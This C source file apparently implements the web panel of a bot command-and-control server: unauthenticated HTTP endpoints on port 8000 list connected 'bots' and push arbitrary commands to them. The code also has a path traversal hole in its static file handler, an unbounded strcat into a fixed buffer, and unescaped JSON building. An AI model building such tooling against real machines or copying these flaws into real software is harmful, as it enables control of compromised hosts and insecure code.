#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h> // For checking file existence

#include "../lib/mongoose.h"
#include "../include/server/hash_table.h"
#include "../include/commands.h"
#include "../include/logging.h"
#include "../include/web_server.h"

// Assume the hash table is globally accessible
extern ClientHashTable hash_table;

static const char *static_dir = "../static"; // Root directory for static files

// Function to serve static files
static void serve_static_file(struct mg_connection *c, struct mg_http_message *hm) {
    char path[512];
    const char *uri = hm->uri.buf;
    size_t uri_len = hm->uri.len;

    // Remove the "/static/" prefix from the URI
    if (strncmp(uri, "/static/", 8) == 0) {
        uri += 8; // Skip the "/static/" prefix
        uri_len -= 8;
    }

    // Construct the file path
    snprintf(path, sizeof(path), "%s/%.*s", static_dir, (int)uri_len, uri);

    // Log the constructed file path
    output_log("Attempting to serve file: %s\n", LOG_DEBUG, LOG_TO_ALL, path);

    // Check if the file exists
    struct stat st;
    if (stat(path, &st) != 0 || S_ISDIR(st.st_mode)) {
        output_log("File not found: %s\n", LOG_ERROR, LOG_TO_ALL, path);
        mg_http_reply(c, 404, "", "File not found\n");
        return;
    }

    // Serve the file
    struct mg_http_serve_opts opts = {.root_dir = static_dir};
    mg_http_serve_file(c, hm, path, &opts);
}

// Function to list all bots
void handle_list_bots(struct mg_connection *c, struct mg_http_message *hm) {
    char response[4096] = "[";
    bool first = true;

    for (size_t i = 0; i < hash_table.size; i++) {
        Client *client = hash_table.table[i];
        while (client != NULL) {
            if (!first) strcat(response, ",");
            char client_info[256];
            snprintf(client_info, sizeof(client_info),
                     "{\"id\":\"%s\",\"socket\":\"%d\",\"status\":\"%s\"}",
                     client->id,
                     client->socket,
                     client->state == LISTENING ? "listening" :
                     client->state == ACTIVE ? "active" : "unreachable");
            strcat(response, client_info);
            first = false;
            client = client->next;
        }
    }

    strcat(response, "]");
    mg_http_reply(c, 200, "Content-Type: application/json\r\n", "%s", response);
}

// Function to send a command to bots
void handle_send_command(struct mg_connection *c, struct mg_http_message *hm) {
    char bot_ids[256], command[256];
    mg_http_get_var(&hm->body, "bot_ids", bot_ids, sizeof(bot_ids));
    mg_http_get_var(&hm->body, "command", command, sizeof(command));

    char *bot_id = strtok(bot_ids, ",");
    while (bot_id != NULL) {
        Client *client = find_client(&hash_table, bot_id);
        if (client != NULL && client->state != UNREACHABLE) {
            output_log("Sending command '%s' to bot '%s'\n", LOG_INFO, LOG_TO_ALL, command, bot_id);

            char command_json[512];
            snprintf(command_json, sizeof(command_json),
                     "{\"cmd_id\":\"cmd_%s\",\"program\":\"%s\",\"timestamp\":%ld}",
                     bot_id, command, time(NULL));

            send_command(client->socket, command_json, strlen(command_json), 0);
        } else {
            output_log("Bot '%s' is not reachable. Skipping.\n", LOG_WARNING, LOG_TO_ALL, bot_id);
        }

        bot_id = strtok(NULL, ",");
    }

    mg_http_reply(c, 200, "Content-Type: application/json\r\n", "{\"status\":\"success\"}");
}

// HTTP request handler
void handle_request(struct mg_connection *c, int ev, void *ev_data) {
    struct mg_http_message *hm = (struct mg_http_message *) ev_data;
    if (ev == MG_EV_HTTP_MSG) {
        if (strncmp(hm->uri.buf, "/api/bots", hm->uri.len) == 0) {
            handle_list_bots(c, hm);
        } else if (strncmp(hm->uri.buf, "/api/command", hm->uri.len) == 0) {
            handle_send_command(c, hm);
        } else if (strncmp(hm->uri.buf, "/static/", 8) == 0) {
            serve_static_file(c, hm);
        } else {
            mg_http_reply(c, 404, "", "Not Found\n");
        }
    }
}

// Start web interface
void *start_web_interface(void *arg) {
    struct mg_mgr mgr;
    struct mg_connection *c;

    mg_mgr_init(&mgr); // Init the web manager
    c = mg_http_listen(&mgr, "http://0.0.0.0:8000", handle_request, NULL); // Start listening
    if (c == NULL) {
        // The client is not setup
        fprintf(stderr, "Error starting web interface on port 8000\n");
        return NULL;
    }

    output_log("Web interface running on http://0.0.0.0:8000\n", LOG_INFO, LOG_TO_ALL);
    for (;;) {
        mg_mgr_poll(&mgr, 1000);
    }

    mg_mgr_free(&mgr);
    return NULL;
}
